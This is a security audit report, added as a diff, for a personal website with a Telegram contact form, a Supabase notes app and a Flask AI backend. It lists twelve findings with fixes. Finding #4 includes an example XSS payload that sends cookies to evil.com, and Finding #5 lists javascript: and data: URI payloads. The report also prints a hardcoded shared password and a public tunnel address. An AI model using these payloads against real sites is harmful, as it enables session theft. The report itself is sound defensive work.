@@ -1,0 +1,415 @@
+================================================================================
+                        SECURITY AUDIT REPORT
+                      ethgrd.com / ethanskis.github.io
+                           April 13, 2026
+================================================================================
+
+SCOPE
+-----
+Full client-side source review of all HTML/JS/CSS pages, the Python backend
+(bot.py), the CI/CD pipeline (deploy.yml), and runtime configuration files.
+
+Files reviewed:
+  index.html, ai.html, html.html, news.html, notes.html, snake.html,
+  header.js, header.css, bot.py, tunnel.json, .github/workflows/deploy.yml
+
+
+================================================================================
+FINDING SEVERITY SCALE
+================================================================================
+  CRITICAL  — Direct exploitation possible; immediate data loss or takeover
+  HIGH      — Significant risk; exploitable with minimal effort
+  MEDIUM    — Exploitable under certain conditions or with some effort
+  LOW       — Minor issue or defense-in-depth concern
+
+
+================================================================================
+FINDING #1 — Telegram Bot Token Exposed to All Visitors
+================================================================================
+Severity:   CRITICAL
+File:       index.html:330
+            .github/workflows/deploy.yml:23
+
+Description:
+  The CI/CD pipeline injects the real Telegram bot token into client-side
+  JavaScript via sed replacement:
+
+    const TELEGRAM_TOKEN = '__TELEGRAM_BOT_TOKEN__';
+        → becomes →
+    const TELEGRAM_TOKEN = '7xxxxxx:AAxxxxxxx...';
+
+  After deployment, every visitor to the site can open View Source or DevTools
+  and read the live bot token in plain text. The same injection happens for
+  html.html.
+
+Impact:
+  An attacker with the bot token can:
+  - Send messages as the bot to any Telegram user or group
+  - Read incoming messages (via getUpdates)
+  - Enumerate chats the bot participates in
+  - Potentially delete or modify webhooks
+  - Abuse the bot for spam, phishing, or social engineering
+
+Recommendation:
+  Never send API tokens to the browser. Instead, route the contact form
+  through a backend endpoint (e.g., a serverless function or your existing
+  Flask server) that holds the token server-side.
+
+
+================================================================================
+FINDING #2 — Telegram Chat ID Exposed to All Visitors
+================================================================================
+Severity:   HIGH
+File:       index.html:331, ai.html, html.html
+            .github/workflows/deploy.yml:24
+
+Description:
+  The Telegram chat ID is injected into three pages the same way as the bot
+  token. Combined with Finding #1, this gives an attacker the complete
+  credentials needed to send arbitrary messages to your personal Telegram chat.
+
+Impact:
+  - Spam or phishing messages sent directly to your Telegram
+  - Social engineering (an attacker could impersonate a legitimate inquiry)
+
+Recommendation:
+  Same as Finding #1 — move all Telegram API calls server-side.
+
+
+================================================================================
+FINDING #3 — Hardcoded Shared Password for All Notes Users
+================================================================================
+Severity:   CRITICAL
+File:       notes.html:600
+
+Description:
+  Every user of the Notes app authenticates with the same hardcoded password:
+
+    const SECRET = 'shared-secret-xK9mP2';
+
+  The authentication flow constructs an email from the username and uses this
+  single password for all accounts:
+
+    await sb.auth.signInWithPassword({ email: em, password: SECRET });
+
+  This secret is visible in the page source to anyone who visits the site.
+
+Impact:
+  Any visitor can log in as any other user by simply entering their username.
+  There is zero authentication barrier — the password is public knowledge.
+  An attacker can:
+  - Read all notes for any user
+  - Overwrite or delete any user's notes
+  - Enumerate usernames by attempting sign-ins
+
+Recommendation:
+  Implement real per-user authentication. Supabase supports email/password
+  sign-up with unique passwords, OAuth providers (Google, GitHub), and
+  magic-link email login. Any of these would provide actual access control.
+
+
+================================================================================
+FINDING #4 — Stored XSS via Notes Content (Cross-User)
+================================================================================
+Severity:   HIGH
+File:       notes.html:635, 702
+
+Description:
+  Notes content is stored as raw HTML (editor.innerHTML) and loaded back
+  without any sanitization:
+
+    // On page load:
+    if (data?.content) editor.innerHTML = data.content;
+
+    // On realtime sync:
+    tempContainer.innerHTML = remote;
+    morphdom(editor, tempContainer, { childrenOnly: true });
+
+  Because authentication is broken (Finding #3), an attacker can:
+  1. Log in as any user
+  2. Save notes containing malicious HTML, e.g.:
+       <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
+  3. When the real user loads their notes, the script executes
+
+Impact:
+  Full cross-site scripting in the context of the victim's session. The
+  attacker can steal Supabase session tokens, exfiltrate notes data, or
+  perform actions as the victim.
+
+Recommendation:
+  - Sanitize HTML before rendering (use DOMPurify or a similar library)
+  - Fix the authentication model (Finding #3) so attackers cannot write
+    to other users' notes
+  - Consider storing notes in a structured format (e.g., Markdown or a
+    JSON document model) rather than raw HTML
+
+
+================================================================================
+FINDING #5 — XSS via Link Insertion in Notes Editor
+================================================================================
+Severity:   HIGH
+File:       notes.html:872
+
+Description:
+  The "Insert link" feature inserts user-supplied URL and text values
+  directly into the DOM without validation:
+
+    document.execCommand('insertHTML', false,
+      `<a href="${url}" target="_blank">${text || url}</a>`);
+
+  The url variable is not checked for dangerous schemes. A user (or attacker
+  via Finding #3) can insert:
+  - javascript:alert(document.cookie)
+  - data:text/html,<script>...</script>
+  - Malformed HTML to break out of the anchor tag
+
+Impact:
+  Script execution when the link is clicked, or DOM injection that could
+  alter the page structure.
+
+Recommendation:
+  Validate that the URL starts with https:// or http:// before insertion.
+  Escape HTML entities in both url and text. Example:
+
+    if (!/^https?:\/\//i.test(url)) return;
+    const safeUrl = escapeHTML(url);
+    const safeText = escapeHTML(text || url);
+
+
+================================================================================
+FINDING #6 — ngrok Tunnel URL Publicly Accessible
+================================================================================
+Severity:   MEDIUM
+File:       tunnel.json
+
+Description:
+  The file tunnel.json is served as a static asset on the public site:
+
+    {"url":"https://e6ee-67-60-103-198.ngrok-free.app"}
+
+  The AI chat page fetches this file to discover the backend URL:
+
+    const r = await fetch('/tunnel.json?_=' + Date.now());
+
+  Anyone can read this file to learn the current ngrok tunnel endpoint.
+
+Impact:
+  - An attacker knows the exact URL of your backend server
+  - They can send requests directly to your Flask API, bypassing the
+    intended web interface
+  - Combined with the lack of rate limiting (Finding #10), this enables
+    abuse of the LM Studio backend
+
+Recommendation:
+  If the tunnel URL must be discoverable by the frontend, consider adding
+  authentication or an API key requirement to the backend endpoints.
+  Alternatively, use the CI-injected URL only and remove tunnel.json from
+  the deployed site.
+
+
+================================================================================
+FINDING #7 — No Content Security Policy
+================================================================================
+Severity:   MEDIUM
+Files:      All HTML pages
+
+Description:
+  The site does not set Content-Security-Policy headers or meta tags.
+  Scripts are loaded from multiple CDN origins:
+  - cdn.jsdelivr.net (Supabase, morphdom, KaTeX)
+  - cdnjs.cloudflare.com (CodeMirror, Chart.js, D3.js)
+  - fonts.googleapis.com
+
+  Without CSP, the browser has no instruction to restrict script sources.
+
+Impact:
+  - If any CDN is compromised or serves a malicious script, it will execute
+    with full access to the page
+  - Any XSS vulnerability (e.g., Findings #4, #5) is unrestricted — an
+    attacker can load external scripts, exfiltrate data, etc.
+  - No protection against inline script injection
+
+Recommendation:
+  Add a Content-Security-Policy header via GitHub Pages _headers file or a
+  <meta> tag. A starting policy:
+
+    default-src 'self';
+    script-src 'self' cdn.jsdelivr.net cdnjs.cloudflare.com 'unsafe-inline';
+    style-src 'self' fonts.googleapis.com 'unsafe-inline';
+    font-src fonts.gstatic.com;
+    connect-src 'self' *.supabase.co *.ngrok-free.app;
+    img-src 'self' data: https:;
+
+
+================================================================================
+FINDING #8 — postMessage Listener Without Origin Check
+================================================================================
+Severity:   MEDIUM
+File:       html.html:341
+
+Description:
+  The HTML editor listens for messages from the sandboxed preview iframe:
+
+    window.addEventListener('message', function (e) {
+      if (!e.data || !e.data._cm) return;
+      ...
+      entry.className = 'console-entry ' + _cm;
+      entry.textContent = text;
+      ...
+    });
+
+  The listener does not verify e.origin. While the iframe is sandboxed
+  (without allow-same-origin), any window that can obtain a reference to
+  the editor page could post messages with a crafted _cm value.
+
+  The _cm value is used directly in a className assignment. While
+  textContent is used for the message body (safe), a crafted _cm value
+  could inject arbitrary CSS classes.
+
+Impact:
+  Limited — class injection rather than script execution. However, if
+  combined with other vulnerabilities, it could enable UI redressing.
+
+Recommendation:
+  Verify e.origin or e.source before processing messages:
+
+    if (e.source !== preview.contentWindow) return;
+
+
+================================================================================
+FINDING #9 — Backend Exposes Raw Exception Details
+================================================================================
+Severity:   LOW
+File:       bot.py:154
+
+Description:
+  The catch-all exception handler sends the raw exception string to clients:
+
+    except Exception as e:
+        yield f"data: {json.dumps({'error': str(e)})}\n\n"
+
+Impact:
+  Internal error messages may reveal file paths, library versions, or
+  configuration details that help an attacker map the server environment.
+
+Recommendation:
+  Return a generic error message to clients and log the full exception
+  server-side:
+
+    import logging
+    logging.exception("Chat error")
+    yield f'data: {json.dumps({"error": "Internal server error"})}\n\n'
+
+
+================================================================================
+FINDING #10 — No Rate Limiting on Backend or Frontend
+================================================================================
+Severity:   LOW
+File:       bot.py:79, ai.html:689
+
+Description:
+  Neither the Flask backend nor the frontend impose any rate limiting on
+  chat requests. The /chat endpoint forwards every request to LM Studio
+  with a 120-second timeout.
+
+Impact:
+  - An attacker can flood the backend with requests, consuming LM Studio
+    resources (denial of service)
+  - Excessive Telegram API calls from logging could hit Telegram rate limits
+
+Recommendation:
+  Add rate limiting to the Flask app (e.g., flask-limiter) and optionally
+  add client-side throttling.
+
+
+================================================================================
+FINDING #11 — localStorage Used for Chat History
+================================================================================
+Severity:   LOW
+File:       ai.html:293
+
+Description:
+  Full conversation history is stored in localStorage under the key
+  'ethAI_chat_history'. localStorage is accessible to any JavaScript
+  running on the same origin.
+
+Impact:
+  If an XSS vulnerability is found on any page of the site, the attacker
+  can read the full chat history. This may contain sensitive information
+  the user discussed with the AI.
+
+Recommendation:
+  This is acceptable for a personal project but worth noting. If sensitive
+  conversations are expected, consider sessionStorage (cleared on tab close)
+  or prompting before persisting.
+
+
+================================================================================
+FINDING #12 — CORS Allows Localhost Origins in Production
+================================================================================
+Severity:   LOW
+File:       bot.py:33-34
+
+Description:
+  The CORS allowlist includes development origins:
+
+    "http://localhost:5500",
+    "http://127.0.0.1:5500",
+
+  These are always allowed, even in production.
+
+Impact:
+  If an attacker can get a victim to visit a page served on localhost:5500,
+  that page could make authenticated cross-origin requests to the backend.
+  This is a low-probability scenario but violates least-privilege.
+
+Recommendation:
+  Use an environment variable to conditionally include localhost origins
+  only in development mode.
+
+
+================================================================================
+SUMMARY TABLE
+================================================================================
+
+ #   Severity   Finding
+ --  ---------  ---------------------------------------------------------
+  1  CRITICAL   Telegram bot token exposed in client-side JavaScript
+  2  HIGH       Telegram chat ID exposed in client-side JavaScript
+  3  CRITICAL   Hardcoded shared password for all Notes users
+  4  HIGH       Stored XSS via Notes content (cross-user)
+  5  HIGH       XSS via link insertion in Notes editor
+  6  MEDIUM     ngrok tunnel URL publicly accessible
+  7  MEDIUM     No Content Security Policy headers
+  8  MEDIUM     postMessage listener without origin verification
+  9  LOW        Backend exposes raw exception details
+ 10  LOW        No rate limiting on backend or frontend
+ 11  LOW        localStorage used for chat history
+ 12  LOW        CORS allows localhost origins in production
+
+
+================================================================================
+PRIORITY REMEDIATION ORDER
+================================================================================
+
+1. IMMEDIATE: Move Telegram API calls server-side (Findings #1, #2)
+   The bot token is actively exposed on every page load right now.
+
+2. IMMEDIATE: Replace the shared-secret auth in Notes (Finding #3)
+   This completely defeats the purpose of having user accounts.
+
+3. URGENT: Sanitize HTML in Notes app (Findings #4, #5)
+   Use DOMPurify to sanitize content loaded from the database and
+   validate URLs on link insertion.
+
+4. SHORT-TERM: Add a Content Security Policy (Finding #7)
+   This provides defense-in-depth against XSS and CDN compromise.
+
+5. SHORT-TERM: Restrict tunnel.json access and add backend auth (Finding #6)
+
+6. MAINTENANCE: Address remaining low-severity findings (Findings #8-12)
+
+
+================================================================================
+END OF REPORT
+================================================================================
